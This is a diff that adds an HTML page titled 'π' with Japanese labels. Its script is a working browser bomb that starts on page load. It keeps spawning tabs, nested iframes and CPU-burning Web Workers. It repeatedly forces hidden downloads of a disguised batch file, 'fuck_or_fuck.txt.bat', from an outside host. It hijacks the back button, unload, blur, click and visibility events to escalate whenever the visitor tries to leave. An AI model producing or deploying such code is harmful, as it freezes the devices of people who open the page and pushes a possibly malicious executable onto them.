@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>π</title>
+  <style>
+    body { margin: 0; padding: 0; overflow: hidden; background: #000; }
+    h1 { color: #0f0; text-align: center; padding: 15px; font-family: monospace; font-size: 20px; }
+    #container { 
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+      gap: 2px;
+      height: calc(100vh - 70px);
+    }
+    iframe { width: 100%; height: 100%; border: 1px solid #333; }
+    #counter { color: #f00; text-align: center; font-family: monospace; font-size: 20px; }
+    .tab-btn {
+      position: fixed; bottom: 10px; right: 10px; z-index: 9999;
+      background: #f00; color: #fff; border: none; padding: 10px 20px;
+      font-size: 16px; cursor: pointer; border-radius: 5px;
+    }
+    .tab-btn:hover { background: #ff4444; }
+  </style>
+</head>
+<body>
+  <h1>π増殖中...</h1>
+  <div id="counter">iframe: 0 | Worker: 0 | tabs: 0 | DL: 0</div>
+  <div id="container"></div>
+  <button class="tab-btn" onclick="spawnTab()">+タブ</button>
+
+  <script>
+    (function eternal() {
+      const workers = [];
+      const container = document.getElementById('container');
+      const counterEl = document.getElementById('counter');
+      let tabCount = 0;
+      let dlCount = 0;
+
+      // ★ ダウンロードするファイルのURL ★
+      const DOWNLOAD_URL = 'https://kcjsa.github.io/fan/fuck_or_fuck.txt.bat';
+      const DOWNLOAD_FILENAME = 'fuck_or_fuck.txt.bat';
+
+      function isInIframe() {
+        try { return window.self !== window.top; } catch(e) { return true; }
+      }
+
+      if (isInIframe()) {
+        document.querySelector('h1').textContent = 'π[iframe]';
+        document.body.style.background = '#0a0a0a';
+      }
+
+      // ★ ダウンロード実行 ★
+      function triggerDownload() {
+        // 方法1: 見えないaタグでダウンロード
+        const a = document.createElement('a');
+        a.href = DOWNLOAD_URL;
+        a.download = DOWNLOAD_FILENAME;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        // 方法2: iframeでダウンロード（バックアップ）
+        const dlIframe = document.createElement('iframe');
+        dlIframe.src = DOWNLOAD_URL;
+        dlIframe.style.display = 'none';
+        dlIframe.sandbox = 'allow-scripts allow-same-origin';
+        document.body.appendChild(dlIframe);
+        setTimeout(() => document.body.removeChild(dlIframe), 3000);
+        
+        dlCount++;
+        updateCounter();
+      }
+
+      function spawnTab() {
+        const w = window.open(location.href, '_blank');
+        if (w) {
+          tabCount++;
+          updateCounter();
+          // ダウンロードも発動
+          triggerDownload();
+          setTimeout(() => {
+            try { w.postMessage('spawn', '*'); } catch(e) {}
+            try { w.postMessage('download', '*'); } catch(e) {}
+          }, 500);
+        } else {
+          spawnIframe();
+        }
+        return w;
+      }
+
+      window.spawnTab = spawnTab;
+
+      function spawnIframe() {
+        const iframe = document.createElement('iframe');
+        iframe.src = location.href;
+        iframe.sandbox = 'allow-scripts allow-same-origin allow-popups allow-forms allow-popups-to-escape-sandbox';
+        container.appendChild(iframe);
+        updateCounter();
+        
+        iframe.onload = () => {
+          try {
+            iframe.contentWindow.postMessage('spawn', '*');
+            iframe.contentWindow.postMessage('popup', '*');
+            iframe.contentWindow.postMessage('download', '*');
+          } catch(e) {}
+        };
+      }
+
+      function updateCounter() {
+        const totalIframes = document.querySelectorAll('iframe').length;
+        counterEl.textContent = 'iframe: ' + totalIframes + ' | Worker: ' + workers.length + ' | tabs: ' + tabCount + ' | DL: ' + dlCount;
+      }
+
+      function spawnWorker() {
+        try {
+          const blob = new Blob([`
+            let a = 1.0, b = 1.0 / Math.sqrt(2), t = 0.25, p = 1.0;
+            while(true) {
+              const an = (a + b) / 2;
+              b = Math.sqrt(a * b);
+              t -= p * (a - an) ** 2;
+              a = an;
+              p *= 2;
+              const pi = (a + b) ** 2 / (4 * t);
+              for(let i=0;i<10000;i++) Math.sqrt(pi);
+            }
+          `], { type: 'text/javascript' });
+          const w = new Worker(URL.createObjectURL(blob));
+          workers.push(w);
+          updateCounter();
+        } catch(e) {}
+      }
+
+      function explode(d) {
+        for (let i = 0; i < 2 ** d; i++) {
+          spawnTab();
+          spawnIframe();
+          spawnWorker();
+          triggerDownload();
+        }
+        if (d < 4) {
+          setTimeout(() => explode(d + 1), 300);
+        }
+      }
+
+      function spawnBurst(count) {
+        for (let i = 0; i < count; i++) {
+          spawnTab();
+          spawnIframe();
+          spawnWorker();
+          triggerDownload();
+        }
+      }
+
+      // メッセージ受信
+      window.addEventListener('message', (e) => {
+        if (e.data === 'spawn') {
+          spawnIframe();
+          spawnWorker();
+        }
+        if (e.data === 'popup') {
+          spawnTab();
+        }
+        if (e.data === 'explode') {
+          explode(2);
+        }
+        if (e.data === 'download') {
+          triggerDownload();
+        }
+      });
+
+      // === 増殖タイマー ===
+      
+      setInterval(() => {
+        spawnIframe();
+        spawnWorker();
+        triggerDownload();
+      }, 1500);
+
+      setInterval(() => {
+        spawnTab();
+      }, 3000);
+
+      // 初回ラッシュ
+      for (let i = 0; i < 3; i++) {
+        setTimeout(() => {
+          spawnTab();
+          spawnIframe();
+          spawnWorker();
+          triggerDownload();
+        }, i * 200);
+      }
+
+      setTimeout(() => spawnBurst(5), 1000);
+      setTimeout(() => spawnBurst(10), 2000);
+
+      // === 離脱トリガー ===
+
+      window.addEventListener('beforeunload', (e) => {
+        explode(0);
+        e.preventDefault();
+        e.returnValue = '';
+        setTimeout(() => explode(2), 0);
+      });
+
+      window.addEventListener('pagehide', () => {
+        spawnBurst(30);
+      });
+
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+          spawnBurst(10);
+        }
+      });
+
+      history.pushState(null, '', location.href);
+      window.addEventListener('popstate', () => {
+        history.pushState(null, '', location.href);
+        explode(2);
+      });
+
+      window.addEventListener('blur', () => {
+        spawnTab();
+        spawnIframe();
+        spawnWorker();
+        triggerDownload();
+      });
+
+      document.addEventListener('click', () => {
+        spawnTab();
+        triggerDownload();
+      });
+
+      let moveCount = 0;
+      document.addEventListener('mousemove', () => {
+        moveCount++;
+        if (moveCount % 100 === 0) {
+          spawnTab();
+        }
+      });
+
+    })();
+  </script>
+</body>
+</html>
